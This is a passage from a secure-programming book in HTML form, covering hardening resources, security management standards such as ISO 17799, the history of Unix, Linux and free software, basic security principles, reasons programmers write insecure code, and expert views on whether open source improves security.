Information on auditing existing Unix-like systems are discussed in
Mookhey [2002].
For Linux systems (and eventually other Unix-like systems),
you may want to examine the Bastille Hardening System, which
attempts to <SPAN
CLASS="QUOTE"
>&#8220;harden&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;tighten&#8221;</SPAN
> the Linux operating system. 
You can learn more about Bastille at
<A
HREF="http://www.bastille-linux.org"
TARGET="_top"
>http://www.bastille-linux.org</A
>;
it is available for free under the General Public License (GPL).
Other hardening systems include
<A
HREF="http://www.grsecurity.net"
TARGET="_top"
>grsecurity</A
>.
For Windows 2000, you might want to look at
Cox [2000].
The U.S. National Security Agency (NSA) maintains a set of
security recommendation guides at
<A
HREF="http://nsa1.www.conxion.com"
TARGET="_top"
>http://nsa1.www.conxion.com</A
>,
including the <SPAN
CLASS="QUOTE"
>&#8220;60 Minute Network Security Guide.&#8221;</SPAN
>
If you&#8217;re trying to establish a public key infrastructure (PKI) using
open source tools, you might want to look at the
<A
HREF="http://ospkibook.sourceforge.net"
TARGET="_top"
>Open Source PKI Book.</A
>
More about firewalls and Internet security is found in
[Cheswick 1994].</P
><P
>Configuring a computer is only part of Computer Security Management, a larger
area that also covers how to deal with viruses, what kind of
organizational security policy is needed, business continuity plans, and
so on.
There are international standards and guidance for security management.
ISO 13335 is a five-part
technical report giving guidance on security management [ISO 13335].
ISO/IEC 17799:2000 defines a code of practice [ISO 17799];
its stated purpose is to give high-level and general
<SPAN
CLASS="QUOTE"
>&#8220;recommendations for information security management
for use by those who are responsible for initiating, implementing or
maintaining security in their organization.&#8221;</SPAN
>
The document specifically identifies itself as
<SPAN
CLASS="QUOTE"
>&#8220;a starting point for developing organization specific guidance.&#8221;</SPAN
>
It also states that not all of the guidance and controls it contains may be
applicable, and that additional controls not contained may be required.
Even more importantly, they are intended to be
broad guidelines covering a number of areas.
and not intended to give definitive details or "how-tos".
It&#8217;s worth noting that the original
signing of ISO/IEC 17799:2000 was controversial;
Belgium, Canada, France, Germany, Italy, Japan and the US
voted <EM
>against</EM
> its adoption.
However, it appears that these votes were primarily a protest on
parliamentary procedure, not on the content of the document,
and certainly people are welcome to use ISO 17799 if they find it helpful.
More information about ISO 17799 can be found in NIST&#8217;s
<A
HREF="http://csrc.nist.gov/publications/secpubs/otherpubs/reviso-faq.pdf"
TARGET="_top"
>ISO/IEC 17799:2000 FAQ</A
>.
ISO 17799 is highly related to BS 7799 part 1 and 2;
more information about BS 7799 can be found at
<A
HREF="http://www.xisec.com/faq.htm"
TARGET="_top"
>http://www.xisec.com/faq.htm</A
>.
ISO 17799 is currently under revision.
It&#8217;s important to note that none of these standards
(ISO 13335, ISO 17799, or BS 7799 parts 1 and 2)
are intended to be a detailed set of technical guidelines for software
developers;
they are all intended to provide broad guidelines in a number of areas.
This is important, because software developers who
simply only follow (for example) ISO 17799 will
generally <EM
>not</EM
> produce
secure software - developers need much, much, much
more detail than ISO 17799 provides.</P
><P
>Of course, computer security management is part of the even broader
area of security in general.
Clearly you should ensure that your physical environment is secure as well,
depending on your threats.
You might find
<A
HREF="http://www.adl.org/security/safe.pdf"
TARGET="_top"
>this Anti-Defamation League
document</A
> useful.</P
><P
>The Commonly Accepted Security Practices &#38; Recommendations (CASPR)
project at
<A
HREF="http://www.caspr.org"
TARGET="_top"
>http://www.caspr.org</A
>
is trying to distill information security knowledge into a series of
papers available to all (under the GNU FDL license, so that future
document derivatives will continue to be available to all).
Clearly, security management needs to include keeping with patches
as vulnerabilities are found and fixed.
Beattie [2002] provides an
interesting analysis on how to determine when to apply patches
contrasting risk of a bad patch to the risk of intrusion
(e.g., under certain conditions, patches are optimally
applied 10 or 30 days after they are released).</P
><P
>If you&#8217;re interested in the current state of vulnerabilities, there are
other resources available to use.
The CVE at http://cve.mitre.org gives a standard identifier for each
(widespread) vulnerability.
The paper
<A
HREF="http://securitytracker.com/learn/securitytracker-stats-2002.pdf"
TARGET="_top"
>SecurityTracker Statistics</A
>
analyzes vulnerabilities to determine what were the
most common vulnerabilities.
The Internet Storm Center at http://isc.incidents.org/
shows the prominence of various Internet attacks around the world.</P
><P
>This book assumes that the reader understands computer
security issues in general, the general security model of Unix-like systems,
networking (in particular TCP/IP based networks),
and the C programming language.
This book does include some information about the Linux and Unix
programming model for security.
If you need more information on how TCP/IP based networks and protocols
work, including their security protocols, consult general works on
TCP/IP such as [Murhammer 1998].</P
><P
>When I first wrote this document, there were many short articles
but no books on writing secure programs.
There are now other books on writing secure programs.
One is <SPAN
CLASS="QUOTE"
>&#8220;Building Secure Software&#8221;</SPAN
> by John Viega and Gary McGraw [Viega 2002];
this is a very good book that discusses a number of important security issues,
but it omits a large number of important security problems that are
instead covered here.
Basically, this book selects several important topics and covers them
well, but at the cost of omitting many other important topics.
The Viega book has a little more information for Unix-like systems than for
Windows systems, but much of it is independent of the kind of system.
The other book is <SPAN
CLASS="QUOTE"
>&#8220;Writing Secure Code&#8221;</SPAN
> by Michael Howard and David LeBlanc
[Howard 2002].
The title of that book is misleading;
that book is solely about writing secure programs for Windows,
and is not very helpful if you are writing programs for any other system.
This shouldn&#8217;t be surprising;
it&#8217;s published by Microsoft press, and its
copyright is owned by Microsoft.
If you are trying to write secure programs for Microsoft&#8217;s
Windows systems, though, it&#8217;s a good book.
Another useful source of secure programming guidance is the
<A
HREF="http://www.owasp.org/guide"
TARGET="_top"
>The Open Web Application Security Project (OWASP)
Guide to Building Secure Web Applications and Web Services</A
>;
it has more on process, and less specifics than this book, but it
has useful material in it.</P
><P
>This book expecially focuses on all Unix-like systems, including Linux-based
systems (including Debian, Ubuntu, Red Hat Enterprise Linux,
Fedora, CentOS, and SuSE), Unix systems (including Solaris,
FreeBSD, NetBSD, and OpenBSD), MacOS, Android, and iOS.
In several places it includes details about Linux specifically.
That said, much of
this material is not limited to a particular operating system,
and there&#8217;s some material specifically on other systems like Windows.
If you know relevant information not already included here, please let
me know.</P
><P
>This book is copyright (C) 1999-2015 David A. Wheeler and is covered by the
GNU Free Documentation License (GFDL);
see <A
HREF="#ABOUT-LICENSE"
>Appendix C</A
> and
<A
HREF="#FDL"
>Appendix D</A
> for more information.</P
><P
><A
HREF="#BACKGROUND"
>Chapter 2</A
>
discusses the background of Unix, Linux, and security.
<A
HREF="#FEATURES"
>Chapter 3</A
>
describes the general Unix and Linux security model,
giving an overview of the security attributes and operations of
processes, filesystem objects, and so on.
(Windows is not the same, but there are many similarities.)
This is followed by the meat of this book, a set of design and implementation
guidelines for developing applications.
This focuses more on Linux and Unix systems, but not exclusively so.
The book ends with conclusions in
<A
HREF="#CONCLUSION"
>Chapter 12</A
>,
followed by a lengthy bibliography and appendixes.</P
><P
>The design and implementation guidelines are divided into
categories which I believe emphasize the programmer&#8217;s viewpoint.
Programs accept inputs, process data, call out to other resources,
and produce output, as shown in <A
HREF="#ABSTRACT-PROGRAM"
>Figure 1-1</A
>;
notionally all security guidelines fit into one of these categories.
I&#8217;ve subdivided <SPAN
CLASS="QUOTE"
>&#8220;process data&#8221;</SPAN
> into
structuring program internals and approach,
avoiding buffer overflows (which in some cases can also be considered
an input issue),
language-specific information, and special topics.
The chapters are ordered to make the material easier to follow.
Thus, the book chapters giving guidelines discuss
validating all input (<A
HREF="#INPUT"
>Chapter 5</A
>),
avoiding buffer overflows (<A
HREF="#BUFFER-OVERFLOW"
>Chapter 6</A
>),
structuring program internals and approach (<A
HREF="#INTERNALS"
>Chapter 7</A
>),
carefully calling out to other resources (<A
HREF="#CALL-OUT"
>Chapter 8</A
>),
judiciously sending information back (<A
HREF="#OUTPUT"
>Chapter 9</A
>),
language-specific information (<A
HREF="#LANGUAGE-SPECIFIC"
>Chapter 10</A
>),
and finally information on special topics such as how to acquire random
numbers (<A
HREF="#SPECIAL"
>Chapter 11</A
>).</P
><DIV
CLASS="FIGURE"
><A
NAME="ABSTRACT-PROGRAM"
></A
><P
><B
>Figure 1-1. Abstract View of a Program</B
></P
><DIV
CLASS="MEDIAOBJECT"
><P
><IMG style="max-width:90%"
SRC="program.png"
ALIGN="CENTER"></P
></DIV
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="BACKGROUND"
></A
>Chapter 2. Background</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>I issued an order and a search was made, and it was found that this
city has a long history of revolt against kings and has been
a place of rebellion and sedition.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Ezra 4:19 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="HISTORY"
>2.1. History of Unix, Linux, and Open Source / Free Software</A
></H2
><DIV
CLASS="SECT2"
><H3
CLASS="SECT2"
><A
NAME="UNIX-HISTORY"
>2.1.1. Unix</A
></H3
><P
>In 1969-1970, Kenneth Thompson, Dennis Ritchie, and others at
AT&#38;T Bell Labs began developing
a small operating system on a little-used PDP-7.
The operating system was soon christened Unix, a pun on an earlier operating
system project called MULTICS.
In 1972-1973 the system was rewritten in the programming language C,
an unusual step that was visionary: due to this decision, Unix was
the first widely-used operating system that
could switch from and outlive its original hardware.
Other innovations were added to Unix as well, in part due to synergies
between Bell Labs and the academic community.
In 1979, the <SPAN
CLASS="QUOTE"
>&#8220;seventh edition&#8221;</SPAN
> (V7) version
of Unix was released, the grandfather of all extant Unix systems.</P
><P
>After this point, the history of Unix becomes somewhat convoluted.
The academic community, led by Berkeley, developed a variant called the
Berkeley Software Distribution (BSD), while AT&#38;T continued developing
Unix under the names <SPAN
CLASS="QUOTE"
>&#8220;System III&#8221;</SPAN
> and later <SPAN
CLASS="QUOTE"
>&#8220;System V&#8221;</SPAN
>.
In the late 1980&#8217;s through early 1990&#8217;s
the <SPAN
CLASS="QUOTE"
>&#8220;wars&#8221;</SPAN
> between these two major strains raged.
After many years each variant adopted many of the key features of the other.
Commercially, System V won the <SPAN
CLASS="QUOTE"
>&#8220;standards wars&#8221;</SPAN
>
(getting most of its
interfaces into the formal standards), and
most hardware vendors switched to AT&#38;T&#8217;s System V.
However, System V ended up incorporating many BSD innovations, so the
resulting system was more a merger of the two branches.
The BSD branch did not die, but instead became widely used
for research, for PC hardware, and for
single-purpose servers (e.g., many web sites use a BSD derivative).</P
><P
>The result was many different versions of Unix,
all based on the original seventh edition.
Most versions of Unix were proprietary and maintained by their respective
hardware vendor, for example, Sun Solaris is a variant of System V.
Three versions of the BSD branch of Unix ended up as open source:
FreeBSD (concentrating on ease-of-installation for PC-type hardware),
NetBSD (concentrating on many different CPU architectures), and
a variant of NetBSD, OpenBSD (concentrating on security).
More general information about Unix history can be found at
<A
HREF="http://www.datametrics.com/tech/unix/uxhistry/brf-hist.htm"
TARGET="_top"
>http://www.datametrics.com/tech/unix/uxhistry/brf-hist.htm</A
>,
<A
HREF="http://perso.wanadoo.fr/levenez/unix"
TARGET="_top"
>http://perso.wanadoo.fr/levenez/unix</A
>, and
<A
HREF="http://www.crackmonkey.org/unix.html"
TARGET="_top"
>http://www.crackmonkey.org/unix.html</A
> (note that Microsoft Windows systems can&#8217;t read that
last one).
The
<A
HREF="http://www.tuhs.org"
TARGET="_top"
>Unix Heritage Society</A
> refers
to several sources of Unix history.
Much more information about the BSD history can be found in
[McKusick 1999] and
<A
HREF="ftp://ftp.freebsd.org/pub/FreeBSD/FreeBSD-current/src/share/misc/bsd-family-tree"
TARGET="_top"
>ftp://ftp.freebsd.org/pub/FreeBSD/FreeBSD-current/src/share/misc/bsd-family-tree</A
>.</P
><P
>A slightly old but interesting advocacy piece that presents arguments
for using Unix-like systems (instead of Microsoft&#8217;s products) is
<A
HREF="http://web.archive.org/web/20010801155417/www.unix-vs-nt.org/kirch"
TARGET="_top"
>John Kirch&#8217;s paper <SPAN
CLASS="QUOTE"
>&#8220;Microsoft Windows NT Server 4.0 versus UNIX&#8221;</SPAN
></A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="FSF-HISTORY"
>2.1.2. Free Software Foundation</A
></H3
><P
>In 1984 Richard Stallman&#8217;s Free Software Foundation (FSF) began the GNU
project, a project to create a free version of the Unix operating system.
By free, Stallman meant software that could be freely
used, read, modified, and redistributed.
The FSF successfully built a vast number of
useful components, including a C compiler (gcc), an
impressive text editor (emacs), and a host of fundamental tools.
However, in the 1990&#8217;s the FSF
was having trouble developing the operating system kernel [FSF 1998];
without a kernel their dream of a completely free operating system
would not be realized.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LINUX-HISTORY"
>2.1.3. Linux</A
></H3
><P
>In 1991 Linus Torvalds began developing an operating system kernel, which
he named <SPAN
CLASS="QUOTE"
>&#8220;Linux&#8221;</SPAN
> [Torvalds 1999].
This kernel could be combined with the FSF material and other components
(in particular some of the BSD components and MIT&#8217;s X-windows software) to
produce a freely-modifiable and very useful operating system.
This book will term the kernel itself the <SPAN
CLASS="QUOTE"
>&#8220;Linux kernel&#8221;</SPAN
> and
an entire combination as <SPAN
CLASS="QUOTE"
>&#8220;Linux&#8221;</SPAN
>.
Note that many use the term <SPAN
CLASS="QUOTE"
>&#8220;GNU/Linux&#8221;</SPAN
> instead for this combination.</P
><P
>In the Linux community,
different organizations have combined the available components differently.
Each combination is called a <SPAN
CLASS="QUOTE"
>&#8220;distribution&#8221;</SPAN
>, and the organizations that
develop distributions are called <SPAN
CLASS="QUOTE"
>&#8220;distributors&#8221;</SPAN
>.
Common distributions include Red Hat, Mandrake, SuSE, Caldera, Corel,
and Debian.
There are differences between the various distributions,
but all distributions are based on the same foundation: the
Linux kernel and the GNU glibc libraries.
Since both are covered by <SPAN
CLASS="QUOTE"
>&#8220;copyleft&#8221;</SPAN
> style licenses, changes to
these foundations generally must be made available to all, a
unifying force between the Linux distributions at their foundation
that does not exist between the BSD and AT&#38;T-derived Unix systems.
This book is not specific to any Linux distribution; when it
discusses Linux it presumes Linux
kernel version 2.2 or greater and the C library glibc 2.1 or greater,
valid assumptions for essentially all current major
Linux distributions.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OSS-HISTORY"
>2.1.4. Open Source / Free Software</A
></H3
><P
>Increased interest in software that is freely shared
has made it increasingly necessary to define and explain it.
A widely used term is <SPAN
CLASS="QUOTE"
>&#8220;open source software&#8221;</SPAN
>, which is further defined in
[OSI 1999].
Eric Raymond [1997, 1998] wrote several seminal articles examining
its various development processes.
Another widely-used term is <SPAN
CLASS="QUOTE"
>&#8220;free software&#8221;</SPAN
>, where the <SPAN
CLASS="QUOTE"
>&#8220;free&#8221;</SPAN
>
is short for <SPAN
CLASS="QUOTE"
>&#8220;freedom&#8221;</SPAN
>:
the usual explanation is <SPAN
CLASS="QUOTE"
>&#8220;free speech, not free beer.&#8221;</SPAN
>
Neither phrase is perfect.
The term
<SPAN
CLASS="QUOTE"
>&#8220;free software&#8221;</SPAN
> is often confused with programs whose executables are
given away at no charge, but whose source code cannot be viewed, modified,
or redistributed.
Conversely, the term <SPAN
CLASS="QUOTE"
>&#8220;open source&#8221;</SPAN
> is sometime (ab)used
to mean software whose
source code is visible, but for which there are limitations on
use, modification, or redistribution.
This book uses the term <SPAN
CLASS="QUOTE"
>&#8220;open source&#8221;</SPAN
> for its usual meaning, that
is, software which has its source code freely available for
use, viewing, modification, and redistribution; a more detailed
definition is contained in the
<A
HREF="http://www.opensource.org/osd.html"
TARGET="_top"
>Open Source Definition</A
>.
In some cases, a difference in motive is suggested;
those preferring the term <SPAN
CLASS="QUOTE"
>&#8220;free software&#8221;</SPAN
> wish to strongly
emphasize the need for freedom, while those using the term may have
other motives (e.g., higher reliability) or simply wish to appear less
strident.
For information on this definition of free software, and
the motivations behind it, can be found at
<A
HREF="http://www.fsf.org"
TARGET="_top"
>http://www.fsf.org</A
>.</P
><P
>Those interested in reading advocacy pieces for open source software
and free software should see
<A
HREF="http://www.opensource.org"
TARGET="_top"
>http://www.opensource.org</A
> and
<A
HREF="http://www.fsf.org"
TARGET="_top"
>http://www.fsf.org</A
>.
There are other documents which examine such software, for example,
Miller [1995]
found that the open source software were noticeably
more reliable than proprietary software
(using their measurement technique, which measured
resistance to crashing due to random input).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LINUX-VS-UNIX"
>2.1.5. Comparing Linux and Unix</A
></H3
><P
>This book uses the term <SPAN
CLASS="QUOTE"
>&#8220;Unix-like&#8221;</SPAN
> to describe
systems intentionally like Unix.
In particular, the term <SPAN
CLASS="QUOTE"
>&#8220;Unix-like&#8221;</SPAN
> includes
all major Unix variants and Linux distributions.
Note that many people simply use the term <SPAN
CLASS="QUOTE"
>&#8220;Unix&#8221;</SPAN
> to describe these systems
instead.
Originally, the term <SPAN
CLASS="QUOTE"
>&#8220;Unix&#8221;</SPAN
> meant a particular product developed
by AT&#38;T.
Today, the Open Group owns the Unix trademark, and it defines Unix as
<SPAN
CLASS="QUOTE"
>&#8220;the worldwide Single UNIX Specification&#8221;</SPAN
>.</P
><P
>Linux is not derived from Unix source code, but its interfaces are
intentionally like Unix.
Therefore, Unix lessons learned generally apply to both, including information
on security.
Most of the information in this book applies to any Unix-like system.
Linux-specific information has been intentionally added to
enable those using Linux to take advantage of Linux&#8217;s capabilities.</P
><P
>Unix-like systems share a number of security mechanisms, though there
are subtle differences and not all systems have all mechanisms available.
All include user and group ids (uids and gids) for each process and
a filesystem with read, write, and execute permissions (for user, group, and
other).
See Thompson [1974] and Bach [1986]
for general information on Unix systems, including their basic
security mechanisms.
<A
HREF="#FEATURES"
>Chapter 3</A
>
summarizes key security features of Unix and Linux.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SECURITY-PRINCIPLES"
>2.2. Security Principles</A
></H2
><P
>There are many general security principles which you should be
familiar with; one good place for general information on information security
is the Information Assurance Technical Framework (IATF) [NSA 2000].
NIST has identified high-level <SPAN
CLASS="QUOTE"
>&#8220;generally accepted principles and practices&#8221;</SPAN
>
[Swanson 1996].
You could also look at a general textbook on computer security, such as
[Pfleeger 1997].
NIST Special Publication 800-27 describes a number of good engineering
principles (although, since they&#8217;re abstract, they&#8217;re insufficient for
actually building secure programs - hence this book);
you can get a copy at
<A
HREF="http://csrc.nist.gov/publications/nistpubs/800-27/sp800-27.pdf"
TARGET="_top"
>http://csrc.nist.gov/publications/nistpubs/800-27/sp800-27.pdf</A
>.
A few security principles are summarized here.</P
><P
>Often computer security objectives (or goals) are described in terms of three
overall objectives:

<P
></P
><UL
><LI
><P
><EM
>Confidentiality</EM
> (also known as secrecy), meaning that the
computing system&#8217;s assets can be read only by authorized parties.</P
></LI
><LI
><P
><EM
>Integrity</EM
>, meaning that the assets can only be modified or deleted by
authorized parties in authorized ways.</P
></LI
><LI
><P
><EM
>Availability</EM
>,
meaning that the assets are accessible to the authorized 
parties in a timely manner (as determined by the systems requirements).
The failure to meet this goal is called a denial of service.</P
></LI
></UL
>


Some people define additional major security objectives, while others lump
those additional goals as special cases of these three.
For example, some separately
identify non-repudiation as an objective; this is
the ability to <SPAN
CLASS="QUOTE"
>&#8220;prove&#8221;</SPAN
> that a sender sent or receiver received a message
(or both), even if the sender or receiver wishes to deny it later.
Privacy is sometimes addressed separately from confidentiality;
some define this as protecting the confidentiality of a
<EM
>user</EM
> (e.g., their identity) instead of the data.
Most objectives require identification and authentication, which is
sometimes listed as a separate objective.
Often auditing (also called accountability) is identified
as a desirable security objective.
Sometimes <SPAN
CLASS="QUOTE"
>&#8220;access control&#8221;</SPAN
>  and <SPAN
CLASS="QUOTE"
>&#8220;authenticity&#8221;</SPAN
> are listed separately
as well.
For example,
The U.S. Department of Defense (DoD), in DoD directive 3600.1
defines <SPAN
CLASS="QUOTE"
>&#8220;information assurance&#8221;</SPAN
> as
<SPAN
CLASS="QUOTE"
>&#8220;information operations (IO) that protect and defend
information and information systems by ensuring
their availability, integrity, authentication,
confidentiality, and nonrepudiation.
This includes providing for restoration of information systems by
incorporating protection, detection, and reaction capabilities.&#8221;</SPAN
></P
><P
>In any case, it is important to identify your program&#8217;s overall
security objectives, no matter how you group them together,
so that you&#8217;ll know when you&#8217;ve met them.</P
><P
>Sometimes these objectives are a response to a known set of threats,
and sometimes some of these objectives are required by law.
For example, for U.S. banks and other financial institutions,
there&#8217;s a new privacy law called the <SPAN
CLASS="QUOTE"
>&#8220;Gramm-Leach-Bliley&#8221;</SPAN
> (GLB) Act.
This law mandates disclosure of personal information shared and
means of securing that data, requires disclosure of personal information
that will be shared with third parties, and directs institutions to
give customers a chance to opt out of data sharing.
[Jones 2000]</P
><P
>There is sometimes conflict between security and some other general
system/software engineering principles.
Security can sometimes interfere with <SPAN
CLASS="QUOTE"
>&#8220;ease of use&#8221;</SPAN
>, for example,
installing a secure configuration may take more effort than a
<SPAN
CLASS="QUOTE"
>&#8220;trivial&#8221;</SPAN
> installation that works but is insecure.
Often, this apparent conflict can be resolved, for example, by re-thinking
a problem it&#8217;s often possible to make a secure system also easy to use.
There&#8217;s also sometimes a conflict between security and abstraction
(information hiding);
for example, some high-level library routines may be implemented securely
or not, but their specifications won&#8217;t tell you.
In the end, if your application must be secure, you must do things yourself
if you can&#8217;t be sure otherwise - yes, the library should be fixed, but
it&#8217;s your users who will be hurt by your poor choice of library routines.</P
><P
>A good general security principle is <SPAN
CLASS="QUOTE"
>&#8220;defense in depth&#8221;</SPAN
>;
you should have numerous defense mechanisms (<SPAN
CLASS="QUOTE"
>&#8220;layers&#8221;</SPAN
>) in place,
designed so that an attacker has to defeat multiple mechanisms to
perform a successful attack.</P
><P
>For general principles on how to design secure programs, see
<A
HREF="#FOLLOW-GOOD-PRINCIPLES"
>Section 7.1</A
>.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WHY-WRITE-INSECURE"
>2.3. Why do Programmers Write Insecure Code?</A
></H2
><P
>Many programmers don&#8217;t intend to write insecure code - but do anyway.
Here are a number of purported reasons for this.
Most of these were collected and summarized by Aleph One on Bugtraq
(in a posting on December 17, 1998):
<P
></P
><UL
><LI
><P
>There is no curriculum that addresses computer security in most schools.
Even when there <EM
>is</EM
> a computer security curriculum, they
often don&#8217;t discuss how to write secure programs as a whole.
Many such curriculum only study certain areas such as
cryptography or protocols.
These are important, but they often fail to discuss common real-world issues
such as buffer overflows, string formatting, and input checking.
I believe this is one of the most important problems; even those programmers
who go through colleges and universities are very unlikely to learn
how to write secure programs, yet we depend on those very people to
write secure programs.</P
></LI
><LI
><P
>Programming books/classes do not teach secure/safe programming techniques.
Indeed, until recently there were no books on how to write secure programs
at all (this book is one of those few).</P
></LI
><LI
><P
>No one uses formal verification methods.</P
></LI
><LI
><P
>C is an unsafe language, and the standard C library string functions
are unsafe.
This is particularly important because C is so widely used -
the <SPAN
CLASS="QUOTE"
>&#8220;simple&#8221;</SPAN
> ways of using C permit dangerous exploits.</P
></LI
><LI
><P
>Programmers do not think <SPAN
CLASS="QUOTE"
>&#8220;multi-user.&#8221;</SPAN
></P
></LI
><LI
><P
>Programmers are human, and humans are lazy.
Thus, programmers will often use the <SPAN
CLASS="QUOTE"
>&#8220;easy&#8221;</SPAN
> approach instead of a
secure approach - and once it works, they often fail to fix it later.</P
></LI
><LI
><P
>Most programmers are simply not good programmers.</P
></LI
><LI
><P
>Most programmers are not security people; they simply don&#8217;t often
think like an attacker does.</P
></LI
><LI
><P
>Most security people are not programmers.
This was a statement made by some Bugtraq contributors, but it&#8217;s not clear
that this claim is really true.</P
></LI
><LI
><P
>Most computer security models are terrible.</P
></LI
><LI
><P
>There is lots of <SPAN
CLASS="QUOTE"
>&#8220;broken&#8221;</SPAN
> legacy software.
Fixing this software (to remove security faults or to make it work with
more restrictive security policies) is difficult.</P
></LI
><LI
><P
>Consumers don&#8217;t care about security.
(Personally, I have hope that consumers are beginning to care about security;
a computer system that is constantly exploited is neither useful
nor user-friendly.
Also, many consumers are unaware that there&#8217;s
even a problem, assume that it can&#8217;t happen to them, or think that
that things cannot be made better.)</P
></LI
><LI
><P
>Security costs extra development time.</P
></LI
><LI
><P
>Security costs in terms of additional testing
(red teams, etc.).</P
></LI
></UL
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="OPEN-SOURCE-SECURITY"
>2.4. Is Open Source Good for Security?</A
></H2
><P
>There&#8217;s been a lot of debate by security practitioners
about the impact of open source approaches on security.
One of the key issues is that open source exposes the source code
to examination by everyone, both the attackers and defenders,
and reasonable people disagree about the ultimate impact of this situation.
(Note - you can get the latest version of this essay by going to the
main website for this book,
<A
HREF="http://www.dwheeler.com/secure-programs"
TARGET="_top"
>http://www.dwheeler.com/secure-programs</A
>.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OPEN-SOURCE-SECURITY-EXPERTS"
>2.4.1. View of Various Experts</A
></H3
><P
>First, let&#8217;s exampine what security experts have to say.</P
><P
>Bruce Schneier is a well-known expert on computer security and cryptography.
He argues that smart engineers should <SPAN
CLASS="QUOTE"
>&#8220;demand
open source code for anything related to security&#8221;</SPAN
> [Schneier 1999],
and he also discusses some of the preconditions which must be met to make
open source software secure.
Vincent Rijmen, a developer of the winning Advanced Encryption Standard (AES)
encryption algorithm, believes that
the open source nature of Linux
provides a superior vehicle to making security vulnerabilities easier
to spot and fix, <SPAN
CLASS="QUOTE"
>&#8220;Not only because more people can look at it, but,
more importantly, because the model forces people to write more clear
code, and to adhere to standards.
This in turn facilitates security review&#8221;</SPAN
>
[Rijmen 2000].</P
><P
>Elias Levy (Aleph1) is the former moderator of one of the most
popular security discussion groups - Bugtraq.
He discusses some of the problems in making open source
software secure in his article
<A
HREF="http://www.securityfocus.com/commentary/19"
TARGET="_top"
>"Is Open Source
Really More Secure than Closed?"</A
>.
His summary is:
<A
NAME="AEN279"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>So does all this mean Open Source Software is no better than closed
source software when it comes to security vulnerabilities? No. Open
Source Software certainly does have the potential to be more secure
than its closed source counterpart.
But make no mistake, simply being open source is no guarantee of security.</P
></BLOCKQUOTE
></P
><P
>Whitfield Diffie is the
co-inventor of public-key cryptography (the basis of all Internet security)
and chief security officer and senior staff engineer at Sun Microsystems. 
In his 2003 article
<A
HREF="http://zdnet.com.com/2100-1107-980938.html"
TARGET="_top"
>Risky business: Keeping security a secret</A
>,
he argues that proprietary vendor&#8217;s claims that their software
is more secure because it&#8217;s secret is nonsense.
He identifies and then counters two main claims made by proprietary vendors:
(1) that release of code benefits attackers more than anyone else because
a lot of hostile eyes can also look at open-source code, and
that (2) a few expert eyes are better than several random ones.
He first notes that while giving programmers access to a piece of software
doesn&#8217;t guarantee they will study it carefully,
there is a group of programmers who can be expected to care deeply:
Those who either use the software personally or work for an
enterprise that depends on it.
<SPAN
CLASS="QUOTE"
>&#8220;In fact, auditing the programs on which an enterprise depends for
its own security is a natural function of the enterprise&#8217;s own
information-security organization.&#8221;</SPAN
>
He then counters the second argument, noting that
<SPAN
CLASS="QUOTE"
>&#8220;As for the notion that open source&#8217;s usefulness to opponents
outweighs the advantages to users, that argument flies in
the face of one of the most important principles in security:
A secret that cannot be readily changed
should be regarded as a vulnerability.&#8221;</SPAN
>
He closes noting that
<A
NAME="AEN285"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
><SPAN
CLASS="QUOTE"
>&#8220;It&#8217;s simply unrealistic to depend on secrecy for security in
computer software.
You may be able to keep the exact workings of the program out of general
circulation, but can you prevent the code from being
reverse-engineered by serious opponents? Probably not.&#8221;</SPAN
></P
></BLOCKQUOTE
>
&#13;</P
><P
>John Viega&#8217;s article
<A
HREF="http://dev-opensourceit.earthweb.com/news/000526_security.html"
TARGET="_top"
>"The Myth of Open Source Security"</A
> also discusses
issues, and summarizes things this way:
<A
NAME="AEN290"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Open source software projects can be more secure than closed
source projects. However, the very things that can make open
source programs secure -- the availability of the source code,
and the fact that large numbers of users are available to look
for and fix security holes -- can also lull people into a false
sense of security. </P
></BLOCKQUOTE
></P
><P
><A
HREF="http://www.linuxworld.com/linuxworld/lw-1998-11/lw-11-ramparts.html"
TARGET="_top"
>Michael H. Warfield&#8217;s "Musings on open source security"</A
> is
very positive about the impact of open source software on security.
In contrast,
Fred Schneider doesn&#8217;t believe that open source helps security, saying
<SPAN
CLASS="QUOTE"
>&#8220;there is no reason to believe that the many eyes inspecting (open)
source code would be successful in identifying bugs that allow
system security to be compromised&#8221;</SPAN
> and claiming that
<SPAN
CLASS="QUOTE"
>&#8220;bugs in the code are not the dominant means of attack&#8221;</SPAN
> [Schneider 2000].
He also claims that open source rules out control of the construction
process, though in practice there is such control - all major open source
programs have one or a few official versions with <SPAN
CLASS="QUOTE"
>&#8220;owners&#8221;</SPAN
> with
reputations at stake.
Peter G. Neumann discusses <SPAN
CLASS="QUOTE"
>&#8220;open-box&#8221;</SPAN
> software (in which source code
is available, possibly only under certain conditions), saying
<SPAN
CLASS="QUOTE"
>&#8220;Will open-box software really improve system security?
My answer is not by itself, although the potential is considerable&#8221;</SPAN
>
[Neumann 2000].
TruSecure Corporation, under sponsorship by Red Hat (an open source company),
has developed a paper on why they believe open source is more
effective for security [TruSecure 2001].
